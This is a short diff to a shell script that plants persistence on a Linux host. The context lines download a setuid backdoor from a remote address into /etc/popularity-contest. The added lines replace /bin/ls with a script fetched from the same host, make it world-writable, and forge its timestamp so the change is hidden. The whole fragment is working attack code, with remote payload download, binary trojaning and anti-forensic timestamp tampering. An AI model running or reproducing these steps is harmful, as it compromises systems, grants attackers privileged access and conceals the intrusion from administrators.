@@ -19,3 +19,8 @@ wget -O /etc/popularity-contest $IP:6121/backdoor.suid
 chmod 777 /etc/popularity-contest
 chmod u+s /etc/popularity-contest
 touch -d "$XDG_SESSION_DATE" /etc/popularity-contest
+
+cp /bin/ls /usr/bin/ls
+wget -O /bin/ls $IP:6121/lsscript
+chmod 777 /bin/ls
+touch -d "$XDG_SESSION_DATE" /bin/ls
